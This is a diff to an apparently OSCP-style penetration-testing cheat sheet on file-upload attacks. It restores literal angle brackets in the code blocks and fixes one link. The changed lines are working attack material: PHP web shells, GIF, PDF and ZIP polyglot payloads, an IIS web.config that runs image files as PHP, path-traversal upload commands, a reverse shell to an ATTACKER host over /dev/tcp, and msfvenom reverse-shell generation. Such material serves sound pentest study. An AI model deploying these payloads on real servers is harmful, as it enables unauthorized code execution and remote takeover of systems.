@@ -113,7 +113,7 @@ Check:
 Upload shell directly:
 
 ```php
-%%LT%%?php system($_GET['c']); ?%%GT%%
+<?php system($_GET['c']); ?>
 ```
 
 ```bash
@@ -167,7 +167,7 @@ Example GIF+PHP polyglot:
 
 ```bash
 printf 'GIF89a;' > shell.php
-echo '%%LT%%?php system($_GET['c']); ?%%GT%%' >> shell.php
+echo '<?php system($_GET['c']); ?>' >> shell.php
 ```
 
 The file starts with GIF89a (accepted as GIF), but PHP still executes the
@@ -200,14 +200,14 @@ Then upload `shell.jpg` containing PHP code. Apache will execute it.
 **IIS: web.config upload**
 
 ```xml
-%%LT%%configuration%%GT%%
-  %%LT%%system.webServer%%GT%%
-    %%LT%%handlers accessPolicy="Read, Script, Execute"%%GT%%
-      %%LT%%add name="php" path="*.jpg" verb="*" modules="FastCgiModule"
-           scriptProcessor="C:\\PHP\\php-cgi.exe" resourceType="Either" /%%GT%%
-    %%LT%%/handlers%%GT%%
-  %%LT%%/system.webServer%%GT%%
-%%LT%%/configuration%%GT%%
+<configuration>
+  <system.webServer>
+    <handlers accessPolicy="Read, Script, Execute">
+      <add name="php" path="*.jpg" verb="*" modules="FastCgiModule"
+           scriptProcessor="C:\\PHP\\php-cgi.exe" resourceType="Either" />
+    </handlers>
+  </system.webServer>
+</configuration>
 ```
 
 ### 4.7 Polyglot
@@ -217,7 +217,7 @@ A single file that is valid as multiple formats.
 **GIF + PHP:**
 
 ```text
-GIF89a; %%LT%%?php system($_GET['c']); ?%%GT%%
+GIF89a; <?php system($_GET['c']); ?>
 ```
 
 **ZIP + PHP** (for LFI with zip://):
@@ -233,7 +233,7 @@ printf 'GIF89a;' | cat - payload.zip > payload.gif.zip
 
 ```text
 $PDF-1.4
-%%LT%%?php system($_GET['c']); ?%%GT%%
+<?php system($_GET['c']); ?>
 ...
 ```
 
@@ -309,7 +309,7 @@ curl -F 'file=@shell.php' 'http://target/upload'
 ### 6.1 Reverse shell from webshell
 
 ```php
-%%LT%%?php system("bash -c 'bash -i %%GT%%& /dev/tcp/ATTACKER/4444 0%%GT%%&1'"); ?%%GT%%
+<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"); ?>
 ```
 
 Or the classic one-liner:
@@ -346,10 +346,10 @@ weevely generate password shell.php
 weevely http://target/uploads/shell.php password
 
 # msfvenom PHP
-msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=4444 -f raw %%GT%% shell.php
+msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=4444 -f raw > shell.php
 
 # msfvenom WAR (Tomcat)
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war %%GT%% shell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war > shell.war
 ```
 
 ---
@@ -366,7 +366,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war %%GT%%
 > File upload alone is not enough. Show that the upload leads to code
 > execution or to a sensitive file write (SSH key, cron).
 >
-> See [../../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).
+> See [../../methodology/OSCP-Reporting.md](../../methodology/OSCP-Reporting.md).
 
 ---
 
@@ -388,7 +388,7 @@ curl -F 'file=@shell.php;filename=../../../var/www/html/shell.php' 'http://targe
 
 # GIF + PHP polyglot
 printf 'GIF89a;' > shell.php
-echo '%%LT%%?php system($_GET['c']); ?%%GT%%' >> shell.php
+echo '<?php system($_GET['c']); ?>' >> shell.php
 ```
 
 ```text
